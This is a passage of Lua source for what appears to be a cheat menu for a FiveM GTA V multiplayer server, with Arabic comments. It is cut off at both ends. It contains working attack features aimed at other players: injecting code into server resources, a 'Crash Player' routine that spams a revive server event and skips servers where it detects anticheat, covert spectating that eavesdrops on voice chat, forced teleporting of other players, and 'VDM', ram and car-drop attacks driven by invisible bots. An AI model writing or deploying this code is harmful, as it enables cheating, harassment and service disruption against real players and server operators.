                local mouseX = GetDisabledControlNormal(0, 1)
                local mouseY = GetDisabledControlNormal(0, 2)

                camRot = vector3(
                    math.max(-89.0, math.min(89.0, camRot.x - mouseY * 5.0)),
                    0.0,
                    camRot.z - mouseX * 5.0
                )

                -- حساب اتجاه الكاميرا
                local direction = RotationToDirection(camRot)
                local camCoords = targetCoords - direction * camDistance + vector3(0.0, 0.0, 1.0)

                SetCamCoord(spectateCamera, camCoords.x, camCoords.y, camCoords.z)
                PointCamAtEntity(spectateCamera, ped, 0.0, 0.0, 0.0, true)
                SetCamRot(spectateCamera, camRot.x, camRot.y, camRot.z, 2)

                -- تعطيل التحكم الكامل
                DisableAllControlActions(0)
                EnableControlAction(0, 1, true) -- ماوس X
                EnableControlAction(0, 2, true) -- ماوس Y

                Citizen.Wait(0)
            end
        end)

        NetworkSetTalkerProximity(9999.0) -- نسمع الصوت من بعيد
        NetworkClearVoiceChannel()

        MachoMenuNotification("Spectate", "Spectating ID: " .. GetPlayerServerId(selectedPlayer))
    end,

    function()
        isSpectating = false
        spectatingTarget = nil
        SetPlayerControl(PlayerId(), true, 0)

        if spectateCamera then
            RenderScriptCams(false, false, 0, true, true)
            DestroyCam(spectateCamera, false)
            spectateCamera = nil
        end

        NetworkSetTalkerProximity(15.0)

        MachoMenuNotification("Spectate", "Stopped spectating")
    end
)
MachoMenuCheckbox(InfoSection, "Teleport Player to Me",  
    function()
        local selectedPlayer = MachoMenuGetSelectedPlayer()
        if not selectedPlayer or selectedPlayer == -1 then
            return MachoMenuNotification("Error", "No player selected")
        end

        local targetPed = GetPlayerPed(selectedPlayer)
        if not DoesEntityExist(targetPed) then
            return MachoMenuNotification("Error", "Player not found")
        end

        isAutoTeleporting = true
        teleportingTarget = selectedPlayer

        Citizen.CreateThread(function()
            while isAutoTeleporting and DoesEntityExist(GetPlayerPed(teleportingTarget)) do
                local targetPed = GetPlayerPed(teleportingTarget)
                local playerPed = PlayerPedId()
                
                if DoesEntityExist(targetPed) and DoesEntityExist(playerPed) then
                    local myCoords = GetEntityCoords(playerPed)

                    -- طلب التحكم في الكيان قبل محاولة النقل
                    local timeout = 0
                    while not NetworkHasControlOfEntity(targetPed) and timeout < 50 do
                        NetworkRequestControlOfEntity(targetPed)
                        Citizen.Wait(100)
                        timeout = timeout + 1
                    end

                    -- فقط حاول تنقله لو حصلت التحكم
                    if NetworkHasControlOfEntity(targetPed) then
                        SetEntityCoords(targetPed, myCoords.x + 1.0, myCoords.y + 1.0, myCoords.z, false, false, false, true)
                    else
                        MachoMenuNotification("Error", "Couldn't get control of player")
                    end
                end

                Citizen.Wait(1000)
            end
        end)

        MachoMenuNotification("Auto Teleport", "Started auto teleporting ID: " .. GetPlayerServerId(selectedPlayer))
    end,

    function()
        isAutoTeleporting = false
        teleportingTarget = nil

        MachoMenuNotification("Auto Teleport", "Stopped auto teleporting")
    end
)


function RotationToDirection(rot)
    local radX = math.rad(rot.x)
    local radZ = math.rad(rot.z)
    return vector3(
        -math.sin(radZ) * math.abs(math.cos(radX)),
        math.cos(radZ) * math.abs(math.cos(radX)),
        math.sin(radX)
    )
end

MachoMenuButton(InfoSection, "Crash Player", function()
    local selectedPlayer = MachoMenuGetSelectedPlayer()
    if selectedPlayer and selectedPlayer ~= -1 then
        local targetPed = GetPlayerPed(selectedPlayer)
        if targetPed and DoesEntityExist(targetPed) then
            -- More notifications to give a searching impression
            Citizen.Wait(500)
            MachoMenuNotification("Search", "Checking for Crasher...")
            Citizen.Wait(500)
            MachoMenuNotification("Search", "Analyzing...")
            Citizen.Wait(500)
            
            -- Main loading notification
            MachoMenuNotification("Loading", "loading Crasher...")

            local targetServerId = GetPlayerServerId(selectedPlayer)
            
            -- Wait for a moment to give the "loading" message some time to display
            Citizen.Wait(1000)

            -- Check if any of the specified resources exist
            local isProtectedServer = false
            if GetResourceState("EC_AC") == "started" then
                isProtectedServer = true
            end

            if not isProtectedServer and GetResourceState("vrp") == "started" then
                isProtectedServer = true
            end

            if not isProtectedServer then
                local allResources = GetNumResources()
                for i = 0, allResources - 1 do
                    local resourceName = GetResourceByFindIndex(i)
                    if string.sub(resourceName, 1, 4) == "esx_" then
                        isProtectedServer = true
                        break
                    end
                end
            end

            if isProtectedServer then
                -- If any of the resources are found, show the "cannot revive" notification
                MachoMenuNotification("Error", "you can't use the Crasher in this server")
            else
                -- If none of the specified resources are found, proceed with the revive spam
                MachoInjectResource("any", [[
                    Citizen.CreateThread(function()
                        local targetServerId = ]] .. targetServerId .. [[
                        local count = 0
                        while count < 120 do
                            TriggerServerEvent("hospital:server:RevivePlayer", targetServerId)
                            Citizen.Wait(1) -- Delay of 1 millisecond
                            count = count + 1
                        end
                    end)
                ]])
                MachoMenuNotification("Success", "Sent Crash to Player ID: " .. targetServerId)

            end
        else
            MachoMenuNotification("Error", "Player not found")
        end
    else
        MachoMenuNotification("Error", "No player selected")
    end
end)
MachoMenuButton(InfoSection, "Goto Player", function()
    local selectedPlayer = MachoMenuGetSelectedPlayer()  
    if selectedPlayer and selectedPlayer ~= -1 then      
        local targetPed = GetPlayerPed(selectedPlayer)   
        if targetPed and DoesEntityExist(targetPed) then
            local targetCoords = GetEntityCoords(targetPed)
            local playerPed = PlayerPedId()
            SetEntityCoords(playerPed, targetCoords.x + 1.0, targetCoords.y + 1.0, targetCoords.z, false, false, false, true)
            MachoMenuNotification("Players", "Teleported to Player ID: " .. GetPlayerServerId(selectedPlayer))
        else
            MachoMenuNotification("Error", "Player not found")
        end
    else
        MachoMenuNotification("Error", "No player selected")
    end
end)



MachoMenuButton(InfoSection, "Copy Outfit", function()
    local selectedPlayer = MachoMenuGetSelectedPlayer()
    
    if not selectedPlayer then
        MachoMenuNotification("Error", "No player selected! Select a player from the list first.")
        return
    end
    
    local targetPed = GetPlayerPed(selectedPlayer)
    if not DoesEntityExist(targetPed) then
        MachoMenuNotification("Error", "Target player not found!")
        return
    end
    
    -- Clone the outfit
    local playerPed = PlayerPedId()
    
    -- Get all clothing components from target player
    for i = 0, 11 do
        local componentId = GetPedDrawableVariation(targetPed, i)
        local textureId = GetPedTextureVariation(targetPed, i)
        SetPedComponentVariation(playerPed, i, componentId, textureId, 0)
    end
    
    -- Get all props from target player
    for i = 0, 7 do
        local propId = GetPedPropIndex(targetPed, i)
        local propTexture = GetPedPropTextureIndex(targetPed, i)
        if propId ~= -1 then
            SetPedPropIndex(playerPed, i, propId, propTexture, true)
        else
            ClearPedProp(playerPed, i)
        end
    end
    
    local targetName = GetPlayerName(selectedPlayer)
    MachoMenuNotification("Clone Outfit", "Cloned outfit from " .. targetName)
end)


MachoMenuButton(InfoSection, "Into Vehicle", function()
    local selectedPlayer = MachoMenuGetSelectedPlayer()
    if selectedPlayer and selectedPlayer ~= -1 then
        local targetPed = GetPlayerPed(selectedPlayer)
        if targetPed and DoesEntityExist(targetPed) then
            local vehicle = GetVehiclePedIsIn(targetPed, false)
            if vehicle and vehicle ~= 0 then
                local playerPed = PlayerPedId()
                local freeSeat = -1
                for seat = 0, GetVehicleMaxNumberOfPassengers(vehicle) do
                    if IsVehicleSeatFree(vehicle, seat) then
                        freeSeat = seat
                        break
                    end
                end
                if freeSeat ~= -1 then
                    TaskWarpPedIntoVehicle(playerPed, vehicle, freeSeat)
                    MachoMenuNotification("Players", "Entered Player " .. GetPlayerServerId(selectedPlayer) .. "'s vehicle")
                else
                    MachoMenuNotification("Error", "No free seats in vehicle")
                end
            else
                MachoMenuNotification("Error", "Player is not in a vehicle")
            end
        else
            MachoMenuNotification("Error", "Player not found")
        end
    else
        MachoMenuNotification("Error", "No player selected")
    end
end)

MachoMenuButton(InfoSection, "Ride Player", function()
    local selectedPlayer = MachoMenuGetSelectedPlayer()
    
    if not selectedPlayer then
        MachoMenuNotification("Error", "No player selected! Select a player from the list first.")
        return
    end
    
    -- Check if already attached
    if IsEntityAttached(PlayerPedId()) then
        -- Stop piggyback
        ClearPedSecondaryTask(PlayerPedId())
        DetachEntity(PlayerPedId(), true, false)
        MachoMenuNotification("Piggyback", "Stopped piggyback ride")
    else
        -- Start piggyback
        local playerPed = GetPlayerPed(selectedPlayer)
        
        if not DoesEntityExist(playerPed) then
            MachoMenuNotification("Error", "Target player not found!")
            return
        end
        
        -- Load animation
        if not HasAnimDictLoaded("anim@arena@celeb@flat@paired@no_props@") then
            RequestAnimDict("anim@arena@celeb@flat@paired@no_props@")
            while not HasAnimDictLoaded("anim@arena@celeb@flat@paired@no_props@") do
                Citizen.Wait(0)
            end        
        end
        
        -- Attach to player with corrected positioning (rotated LEFT and lower)
        AttachEntityToEntity(PlayerPedId(), playerPed, 0, 0.0, -0.25, 0.45, 0.0, 0.0, 25.0, false, false, false, false, 2, false)
        TaskPlayAnim(PlayerPedId(), "anim@arena@celeb@flat@paired@no_props@", "piggyback_c_player_b", 8.0, -8.0, 1000000, 33, 0, false, false, false)
        
        local targetName = GetPlayerName(selectedPlayer)
        MachoMenuNotification("Piggyback", "Piggyback riding on " .. targetName)
    end
end)
MachoMenuButton(InfoSection, "Attach Vehicles Spam it!", function()
    local selectedPlayer = MachoMenuGetSelectedPlayer()
    if not selectedPlayer or selectedPlayer == -1 then
        MachoMenuNotification("Error", "No player selected")
        return
    end

    local playerPed = PlayerPedId()
    local originalPos = GetEntityCoords(playerPed)
    local originalHeading = GetEntityHeading(playerPed)

    -- Injecting the client-side code into vrp resource
    MachoInjectResource("any", [[
        Citizen.CreateThread(function()
            local selectedPlayer = ]] .. selectedPlayer .. [[
            local targetPed = GetPlayerPed(selectedPlayer)
            
            -- Exit if the target ped does not exist
            if not DoesEntityExist(targetPed) then 
                return 
            end

            local playerPed = PlayerPedId()
            local originalPos = vector3(]] .. originalPos.x .. [[, ]] .. originalPos.y .. [[, ]] .. originalPos.z .. [[)
            local originalHeading = ]] .. originalHeading .. [[
            
            local vehicles = GetGamePool("CVehicle")
            local attachedVehicles = {}
            local failedToAttach = {}
            local targetCoords = GetEntityCoords(targetPed)
            local maxAttachDistance = 1000.0 -- Define a maximum distance for attaching vehicles. Adjust as needed.


            -- Loop through all vehicles in the game pool
            for _, vehicle in pairs(vehicles) do
                -- Check if the vehicle entity exists and is within the defined distance
                if DoesEntityExist(vehicle) and Vdist(GetEntityCoords(vehicle), targetCoords) < maxAttachDistance then
                    local netID = NetworkGetNetworkIdFromEntity(vehicle)
                    local attempts = 0
                    local maxAttempts = 60 -- Increased attempts for network control
                    local waitTime = 5   -- Increased wait time per attempt (in milliseconds)

                    -- Attempt to gain network control of the vehicle
                    while not NetworkHasControlOfEntity(vehicle) and attempts < maxAttempts do
                        NetworkRequestControlOfEntity(vehicle)
                        Citizen.Wait(waitTime) -- Wait for a short period to allow network control to be granted
                        attempts = attempts + 1
                    end

                    -- If network control is successfully gained
                    if NetworkHasControlOfEntity(vehicle) then
                        SetNetworkIdCanMigrate(netID, true) -- Allow network migration
                        SetEntityAsMissionEntity(vehicle, true, true) -- Mark as mission entity to prevent despawn
                        SetVehicleHasBeenOwnedByPlayer(vehicle, true) -- Mark as owned by player

                        -- Attach the vehicle to the target ped
                        -- Parameters: entityToAttach, entityToAttachTo, boneIndex, xOffset, yOffset, zOffset, xRot, yRot, zRot, 
                        --             p_9, useZaxis, p_11, p_12, collision, isPed, vertexIndex, fixedRot
                        AttachEntityToEntity(
                            vehicle, targetPed, 0,
                            0.0, 0.0, 2.0 + (#attachedVehicles * 1.0), -- Stack vehicles vertically
                            0.0, 0.0, 0.0,
                            false, false, true, false, 2, true
                        )
                        table.insert(attachedVehicles, vehicle)
                    else
                        -- Log vehicles that failed to gain control and thus couldn't be attached
                        table.insert(failedToAttach, GetDisplayNameFromVehicleModel(GetEntityModel(vehicle)))
                    end
                end
            end

            -- Display notification for failed attachments
            if #failedToAttach > 0 then
                local failedMsg = "Failed to attach " .. #failedToAttach .. " vehicles: " .. table.concat(failedToAttach, ", ") .. "."
                -- MachoMenuNotification("Warning", failedMsg) -- Uncomment if MachoMenuNotification is available in client-side context
            end

            -- Speed up player movement
            SetPedMoveRateOverride(playerPed, 10.0)

            -- Clear any existing tasks on the player ped before starting the sequence
            ClearPedTasksImmediately(playerPed)

            -- Rapidly enter and exit attached vehicles
            for i, vehicle in ipairs(attachedVehicles) do
                -- Ensure vehicle still exists before interacting
                if not DoesEntityExist(vehicle) then
                    goto continue_loop -- Skip to next iteration
                end

                ClearPedTasksImmediately(playerPed) -- Clear tasks before each new action

                -- Check if the driver's seat is free (-1 indicates driver's seat)
                if IsVehicleSeatFree(vehicle, -1) then
                    -- If the seat is empty, warp the ped directly into the vehicle
                    Citizen.Wait(100) -- Small delay after warping
                else
                    -- If the seat is occupied, use TaskEnterVehicle
                    TaskEnterVehicle(playerPed, vehicle, 1, -1, 100.0, 1, 0) -- Enter as driver, high speed, any seat

                    local taskEnterTimeout = GetGameTimer() + 3000 -- Increased timeout to 3 seconds for TaskEnterVehicle
                    while not IsPedInVehicle(playerPed, vehicle, false) and GetGameTimer() < taskEnterTimeout do
                        Citizen.Wait(10)
                    end

                    -- Fallback: If TaskEnterVehicle failed to complete within the timeout, force warp
                    if not IsPedInVehicle(playerPed, vehicle, false) then
                        ClearPedTasksImmediately(playerPed) -- Clear tasks before fallback warp
                        Citizen.Wait(100) -- Small delay after fallback warp
                    end
                end
                
                -- Check if ped is actually in the vehicle before trying to leave
                if IsPedInVehicle(playerPed, vehicle, false) then
                    Citizen.Wait(100) -- Small delay after entering (or warping)
                    ClearPedTasksImmediately(playerPed) -- Clear tasks before leaving
                    TaskLeaveVehicle(playerPed, vehicle, 0) -- Exit vehicle
                    
                    local leaveTimeout = GetGameTimer() + 900 -- 0.9 seconds timeout for leaving
                    while IsPedInVehicle(playerPed, vehicle, false) and GetGameTimer() < leaveTimeout do
                        Citizen.Wait(10)
                    end
                    Citizen.Wait(100) -- Small delay after exiting
                else
                end

                ClearPedTasksImmediately(playerPed)
                -- Reset player position and heading
                SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                SetEntityHeading(playerPed, originalHeading)
                
                Citizen.Wait(60) -- Quick transition before the next vehicle
                ::continue_loop:: -- Label for goto statement
            end

            -- Reset player movement speed to normal
            SetPedMoveRateOverride(playerPed, 1.0)
        end)
    ]])
    
    -- Notification for the user
    MachoMenuNotification("Injected", "Fast Enter injected for all nearby vehicles. Check console for details.")
end)

MachoMenuButton(PlayerSection, "Ram Player", function()
    local selectedPlayer = MachoMenuGetSelectedPlayer()
    
    if not selectedPlayer then
        MachoMenuNotification("Error", "No player selected! Select a player from the list first.")
        return
    end
    
    local targetPed = GetPlayerPed(selectedPlayer)
    if not DoesEntityExist(targetPed) then
        MachoMenuNotification("Error", "Target player not found!")
        return
    end
    
    local targetVehicle = GetVehiclePedIsIn(targetPed, false)
    local playerPed = PlayerPedId()
    local originalPos = GetEntityCoords(playerPed)
    local originalHeading = GetEntityHeading(playerPed)
    
    -- إذا كان الشخص المختار في سيارة
    if targetVehicle ~= 0 then
        -- التحقق من أن السيارة فارغة من اللاعبين الحقيقيين
        local isVehicleEmpty = true
        local maxSeats = GetVehicleModelNumberOfSeats(GetEntityModel(targetVehicle)) - 1
        
        for seat = -1, maxSeats do
            local pedInSeat = GetPedInVehicleSeat(targetVehicle, seat)
            if pedInSeat ~= 0 then
                local playerId = NetworkGetPlayerIndexFromPed(pedInSeat)
                if playerId ~= -1 and IsPlayerActive(playerId) then
                    isVehicleEmpty = false
                    break
                end
            end
        end
        
        if isVehicleEmpty then
            -- Fast warp for empty vehicle
            SetEntityVisible(playerPed, false, false)
            ClearPedTasksImmediately(playerPed)
            TaskWarpPedIntoVehicle(playerPed, targetVehicle, -1)
            ClearPedTasksImmediately(playerPed)
            TaskLeaveVehicle(playerPed, targetVehicle, 0)
            SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
            SetEntityHeading(playerPed, originalHeading)
            SetEntityVisible(playerPed, true, false)
            
            -- Single VDM attack using MachoInjectResource
            MachoInjectResource("any", [[
                Citizen.CreateThread(function()
                    local targetPed = GetPlayerPed(]] .. selectedPlayer .. [[)
                    local targetVehicle = ]] .. targetVehicle .. [[
                    
                    if DoesEntityExist(targetPed) and DoesEntityExist(targetVehicle) then
                        local targetPos = GetEntityCoords(targetPed)
                        local targetHeading = GetEntityHeading(targetPed)
                        local forwardVec = GetEntityForwardVector(targetPed)
                        local spawnPos = targetPos + forwardVec * 15.0
                        
                        NetworkRequestControlOfEntity(targetVehicle)
                        SetEntityAsMissionEntity(targetVehicle, true, true)
                        
                        -- إنشاء بوت للقيادة
                        local botModel = GetHashKey("mp_m_freemode_01")
                        RequestModel(botModel)
                        while not HasModelLoaded(botModel) do
                            Citizen.Wait(0)
                        end
                        
                        local botPed = CreatePed(4, botModel, 0.0, 0.0, 0.0, 0.0, false, false)
                        
                        SetEntityAsMissionEntity(botPed, false, false)
                        SetPedCanBeDraggedOut(botPed, false)
                        SetPedConfigFlag(botPed, 32, true)
                        SetPedFleeAttributes(botPed, 0, false)
                        SetPedCombatAttributes(botPed, 17, true)
                        SetPedSeeingRange(botPed, 0.0)
                        SetPedHearingRange(botPed, 0.0)
                        SetPedAlertness(botPed, 0)
                        SetPedKeepTask(botPed, true)
                        SetEntityCollision(botPed, false, false)
                        SetEntityVisible(botPed, true, false)
                        NetworkSetEntityInvisibleToNetwork(botPed, true)
                        
                        SetPedIntoVehicle(botPed, targetVehicle, -1)
                        
                        SetVehicleDoorsLocked(targetVehicle, 4)
                        SetVehicleEngineOn(targetVehicle, true, true, false)
                        SetVehicleEnginePowerMultiplier(targetVehicle, 2.0)
                        ModifyVehicleTopSpeed(targetVehicle, 1.5)
                        
                        -- Position vehicle and attack ONCE
                        SetEntityCoordsNoOffset(targetVehicle, spawnPos.x, spawnPos.y, spawnPos.z, false, false, false)
                        SetEntityHeading(targetVehicle, targetHeading + 180.0)
                        PlaceObjectOnGroundProperly(targetVehicle)
                        
                        SetVehicleForwardSpeed(targetVehicle, 35.0)
                        TaskVehicleDriveToCoord(botPed, targetVehicle, targetPos.x, targetPos.y, targetPos.z, 40.0, 0, GetEntityModel(targetVehicle), 786603, 1.0, true)
                        
                        -- Clean up after 5 seconds
                        Citizen.Wait(5000)
                        if DoesEntityExist(botPed) then
                            DeleteEntity(botPed)
                        end
                        SetModelAsNoLongerNeeded(botModel)
                    end
                end)
            ]])
            
            local targetName = GetPlayerName(selectedPlayer)
            MachoMenuNotification("VDM", "Single attack launched on " .. targetName)
            
        else
            MachoMenuNotification("Error", "Target vehicle is occupied by other players!")
        end
        
    -- إذا كان الشخص المختار ليس في سيارة - البحث عن سيارة فارغة
    else
        local targetPos = GetEntityCoords(targetPed)
        
        -- البحث عن أقرب سيارة فارغة
        local closestEmptyVehicle = nil
        local closestDistance = 999999.0
        
        for vehicle in EnumerateVehicles() do
            if DoesEntityExist(vehicle) then
                local vehiclePos = GetEntityCoords(vehicle)
                local distance = #(targetPos - vehiclePos)
                
                if distance < 100.0 then
                    local isVehicleEmpty = true
                    local maxSeats = GetVehicleModelNumberOfSeats(GetEntityModel(vehicle)) - 1
                    
                    for seat = -1, maxSeats do
                        local pedInSeat = GetPedInVehicleSeat(vehicle, seat)
                        if pedInSeat ~= 0 then
                            local playerId = NetworkGetPlayerIndexFromPed(pedInSeat)
                            if playerId ~= -1 and IsPlayerActive(playerId) then
                                isVehicleEmpty = false
                                break
                            end
                        end
                    end
                    
                    if isVehicleEmpty and distance < closestDistance then
                        closestEmptyVehicle = vehicle
                        closestDistance = distance
                    end
                end
            end
        end
        
        if closestEmptyVehicle then
            -- Fast warp for empty vehicle
            SetEntityVisible(playerPed, false, false)
            ClearPedTasksImmediately(playerPed)
            TaskWarpPedIntoVehicle(playerPed, closestEmptyVehicle, -1)
            ClearPedTasksImmediately(playerPed)
            TaskLeaveVehicle(playerPed, closestEmptyVehicle, 0)
            SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
            SetEntityHeading(playerPed, originalHeading)
            SetEntityVisible(playerPed, true, false)
            
            -- Single VDM attack using MachoInjectResource
            MachoInjectResource("any", [[
                Citizen.CreateThread(function()
                    local targetPed = GetPlayerPed(]] .. selectedPlayer .. [[)
                    local targetVehicle = ]] .. closestEmptyVehicle .. [[
                    
                    if DoesEntityExist(targetPed) and DoesEntityExist(targetVehicle) then
                        local targetPos = GetEntityCoords(targetPed)
                        local targetHeading = GetEntityHeading(targetPed)
                        local forwardVec = GetEntityForwardVector(targetPed)
                        local spawnPos = targetPos + forwardVec * 15.0
                        
                        NetworkRequestControlOfEntity(targetVehicle)
                        SetEntityAsMissionEntity(targetVehicle, true, true)
                        
                        -- إنشاء بوت للقيادة
                        local botModel = GetHashKey("mp_m_freemode_01")
                        RequestModel(botModel)
                        while not HasModelLoaded(botModel) do
                            Citizen.Wait(0)
                        end
                        
                        local botPed = CreatePed(4, botModel, 0.0, 0.0, 0.0, 0.0, false, false)
                        
                        SetEntityAsMissionEntity(botPed, false, false)
                        SetPedCanBeDraggedOut(botPed, false)
                        SetPedConfigFlag(botPed, 32, true)
                        SetPedFleeAttributes(botPed, 0, false)
                        SetPedCombatAttributes(botPed, 17, true)
                        SetPedSeeingRange(botPed, 0.0)
                        SetPedHearingRange(botPed, 0.0)
                        SetPedAlertness(botPed, 0)
                        SetPedKeepTask(botPed, true)
                        SetEntityCollision(botPed, false, false)
                        SetEntityVisible(botPed, true, false)
                        NetworkSetEntityInvisibleToNetwork(botPed, true)
                        
                        SetPedIntoVehicle(botPed, targetVehicle, -1)
                        
                        SetVehicleDoorsLocked(targetVehicle, 4)
                        SetVehicleEngineOn(targetVehicle, true, true, false)
                        SetVehicleEnginePowerMultiplier(targetVehicle, 2.0)
                        ModifyVehicleTopSpeed(targetVehicle, 1.5)
                        
                        -- Position vehicle and attack ONCE
                        SetEntityCoordsNoOffset(targetVehicle, spawnPos.x, spawnPos.y, spawnPos.z, false, false, false)
                        SetEntityHeading(targetVehicle, targetHeading + 180.0)
                        PlaceObjectOnGroundProperly(targetVehicle)
                        
                        SetVehicleForwardSpeed(targetVehicle, 35.0)
                        TaskVehicleDriveToCoord(botPed, targetVehicle, targetPos.x, targetPos.y, targetPos.z, 40.0, 0, GetEntityModel(targetVehicle), 786603, 1.0, true)
                        
                        -- Clean up after 5 seconds
                        Citizen.Wait(5000)
                        if DoesEntityExist(botPed) then
                            DeleteEntity(botPed)
                        end
                        SetModelAsNoLongerNeeded(botModel)
                    end
                end)
            ]])
            
            local targetName = GetPlayerName(selectedPlayer)
            MachoMenuNotification("VDM", "Single attack launched on " .. targetName .. " using nearby vehicle")
            
        else
            MachoMenuNotification("Error", "No empty vehicles found near target player!")
        end
    end
end)
MachoMenuButton(PlayerSection, "Crush Player", function()
    local selectedPlayer = MachoMenuGetSelectedPlayer()
    
    if not selectedPlayer then
        MachoMenuNotification("Error", "No player selected! Select a player from the list first.")
        return
    end
    
    local targetPed = GetPlayerPed(selectedPlayer)
    if not DoesEntityExist(targetPed) then
        MachoMenuNotification("Error", "Target player not found!")
        return
    end
    
    local playerPed = PlayerPedId()
    local originalPos = GetEntityCoords(playerPed)
    local originalHeading = GetEntityHeading(playerPed)
    local targetPos = GetEntityCoords(targetPed)
    
    -- البحث عن أقرب سيارة فارغة
    local closestEmptyVehicle = nil
    local closestDistance = 999999.0
    
    for vehicle in EnumerateVehicles() do
        if DoesEntityExist(vehicle) then
            local vehiclePos = GetEntityCoords(vehicle)
            local distance = #(targetPos - vehiclePos)
            
            if distance < 100.0 then
                local isVehicleEmpty = true
                local maxSeats = GetVehicleModelNumberOfSeats(GetEntityModel(vehicle)) - 1
                
                for seat = -1, maxSeats do
                    local pedInSeat = GetPedInVehicleSeat(vehicle, seat)
                    if pedInSeat ~= 0 then
                        local playerId = NetworkGetPlayerIndexFromPed(pedInSeat)
                        if playerId ~= -1 and IsPlayerActive(playerId) then
                            isVehicleEmpty = false
                            break
                        end
                    end
                end
                
                if isVehicleEmpty and distance < closestDistance then
                    closestEmptyVehicle = vehicle
                    closestDistance = distance
                end
            end
        end
    end
    
    if closestEmptyVehicle then
        -- Fast warp to get control
        SetEntityVisible(playerPed, false, false)
        ClearPedTasksImmediately(playerPed)
        TaskWarpPedIntoVehicle(playerPed, closestEmptyVehicle, -1)
        ClearPedTasksImmediately(playerPed)
        TaskLeaveVehicle(playerPed, closestEmptyVehicle, 0)
        SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
        SetEntityHeading(playerPed, originalHeading)
        SetEntityVisible(playerPed, true, false)
        
        -- Car drop attack using MachoInjectResource
        MachoInjectResource("any", [[
            Citizen.CreateThread(function()
                local targetPed = GetPlayerPed(]] .. selectedPlayer .. [[)
                local dropVehicle = ]] .. closestEmptyVehicle .. [[
                
                if DoesEntityExist(targetPed) and DoesEntityExist(dropVehicle) then
                    local targetPos = GetEntityCoords(targetPed)
                    
                    NetworkRequestControlOfEntity(dropVehicle)
                    SetEntityAsMissionEntity(dropVehicle, true, true)
                    
                    Citizen.Wait(100)
                    
                    -- رفع السيارة فوق الهدف بـ 50 متر
                    local dropHeight = 50.0
                    local dropPos = vector3(targetPos.x, targetPos.y, targetPos.z + dropHeight)
                    
                    -- وضع السيارة فوق الهدف
                    SetEntityCoordsNoOffset(dropVehicle, dropPos.x, dropPos.y, dropPos.z, false, false, false)
                    SetEntityHeading(dropVehicle, 0.0)
                    
                    -- إيقاف المحرك
                    SetVehicleEngineOn(dropVehicle, false, false, false)
                    
                    -- إزالة أي قوى أو سرعات
                    SetEntityVelocity(dropVehicle, 0.0, 0.0, 0.0)
                    SetVehicleForwardSpeed(dropVehicle, 0.0)
                    
                    -- فقط تطبيق الجاذبية - لا force إضافية
                    SetEntityHasGravity(dropVehicle, true)
                    
                    -- لا حاجة لأي تحريك إضافي - الجاذبية ستسقط السيارة
                    
                    Citizen.Wait(100)
                    
                    -- التأكد من أن السيارة تتبع قوانين الفيزياء الطبيعية
                    ActivatePhysics(dropVehicle)
                end
            end)
        ]])
        
        local targetName = GetPlayerName(selectedPlayer)
        MachoMenuNotification("Car Drop", "Dropping car on " .. targetName)
        
    else
        MachoMenuNotification("Error", "No empty vehicles found near target player!")
    end
end)
MachoMenuCheckbox(PlayerSection, "VDM Player",
    function()
        enableVDM = true
        local selectedPlayer = MachoMenuGetSelectedPlayer()  
        if selectedPlayer and selectedPlayer ~= -1 then      
            local targetPed = GetPlayerPed(selectedPlayer)  
            if targetPed and DoesEntityExist(targetPed) then
                local targetVehicle = GetVehiclePedIsIn(targetPed, false)
                local originalTargetPlayer = selectedPlayer -- حفظ الشخص المختار أصلاً
               
                -- إذا كان الشخص المختار في سيارة
                if targetVehicle ~= 0 then
                    local playerPed = PlayerPedId()
                    local originalPos = GetEntityCoords(playerPed)
                    local originalHeading = GetEntityHeading(playerPed)
                   
                    -- التحقق من أن السيارة فارغة من اللاعبين الحقيقيين
                    local isVehicleEmpty = true
                    local maxSeats = GetVehicleModelNumberOfSeats(GetEntityModel(targetVehicle)) - 1
                   
                    for seat = -1, maxSeats do
                        local pedInSeat = GetPedInVehicleSeat(targetVehicle, seat)
                        if pedInSeat ~= 0 then
                            -- Simply check if there's any ped in the seat (removed IsPlayerActive check)
                            local playerId = NetworkGetPlayerIndexFromPed(pedInSeat)
                            if playerId ~= -1 then
                                isVehicleEmpty = false
                                break
                            end
                        end
                    end
                   
                    if isVehicleEmpty then
                        -- السيارة فارغة - وارب سريع جداً بدون أي انتظار
                        local playerPed = PlayerPedId()
                        local originalPos = GetEntityCoords(playerPed)
                        local originalHeading = GetEntityHeading(playerPed)
                       
                        SetEntityVisible(playerPed, false, false)
                        ClearPedTasksImmediately(playerPed)
                        TaskWarpPedIntoVehicle(playerPed, targetVehicle, -1)
                        ClearPedTasksImmediately(playerPed)
                        TaskLeaveVehicle(playerPed, targetVehicle, 0)
                        SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                        SetEntityHeading(playerPed, originalHeading)
                        SetEntityVisible(playerPed, true, false)
                       
                        -- بدء الـ VDM فوراً
                        MachoInjectResource("any", [[
                            vdmActive = true
                            vdmBotPed = nil
                            vdmVehicle = nil
                            originalTargetPlayer = ]] .. originalTargetPlayer .. [[
                           
                            Citizen.CreateThread(function()
                                local targetVehicle = ]] .. targetVehicle .. [[
                               
                                if DoesEntityExist(targetVehicle) and vdmActive then
                                    vdmVehicle = targetVehicle
                                   
                                    NetworkRequestControlOfEntity(targetVehicle)
                                    SetEntityAsMissionEntity(targetVehicle, true, true)
                                   
                                    SetVehicleDoorsLocked(targetVehicle, 4)
                                   
                                    -- إنشاء بوت للقيادة
                                    local botModel = GetHashKey("mp_m_freemode_01")
                                    RequestModel(botModel)
                                    while not HasModelLoaded(botModel) do
                                        if not vdmActive then return end
                                        Citizen.Wait(0)
                                    end
                                   
                                    if not vdmActive then return end
                                   
                                    local botPed = CreatePed(4, botModel, 0.0, 0.0, 0.0, 0.0, false, false)
                                    vdmBotPed = botPed
                                   
                                    SetEntityAsMissionEntity(botPed, false, false)
                                    SetPedCanBeDraggedOut(botPed, false)
                                    SetPedConfigFlag(botPed, 32, true)
                                    SetPedFleeAttributes(botPed, 0, false)
                                    SetPedCombatAttributes(botPed, 17, true)
                                    SetPedSeeingRange(botPed, 0.0)
                                    SetPedHearingRange(botPed, 0.0)
                                    SetPedAlertness(botPed, 0)
                                    SetPedKeepTask(botPed, true)
                                    SetEntityCollision(botPed, false, false)
                                    SetEntityVisible(botPed, true, false)
                                    NetworkSetEntityInvisibleToNetwork(botPed, true)
                                   
                                    SetPedIntoVehicle(botPed, targetVehicle, -1)
